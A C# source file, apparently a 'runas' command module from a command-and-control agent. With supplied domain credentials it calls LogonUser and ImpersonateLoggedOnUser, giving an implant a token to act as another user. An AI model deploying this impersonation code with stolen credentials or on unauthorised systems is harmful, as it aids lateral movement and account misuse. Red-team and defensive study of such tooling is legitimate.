using System;
using System.Collections.Generic;
using System.Linq;
using System.Security.Principal;
using System.Text;
using System.Threading.Tasks;
using Agent.Models;
namespace Agent.Commands
{
    public class RunAs : AgentCommand
    {
        public override string Name => "runas";

        public override string Execute(AgentTask task)
        {
            var userDomain = task.Args[0];
            var password = task.Args[1];
            var split = userDomain.Split('\\');
            var domain = split[0];
            var user = split[1];
            var hToken = IntPtr.Zero;
            if (Native.Advapi.LogonUser(user, domain, password, (int)Native.Advapi.LogonType.LOGON32_LOGON_NEW_CREDENTIALS, (int)Native.Advapi.LogonProvider.LOGON32_PROVIDER_DEFAULT, ref hToken))
            {
                if (Native.Advapi.ImpersonateLoggedOnUser(hToken))
                {
                    var identity = new WindowsIdentity(hToken);
                    return $"Successfully impersonated {identity.Name}";
                }
                return $"Successfully made token but failed to impersonate";
            }
            return $"Failed to make toke and impersonate {userDomain}";

        }
    }
}
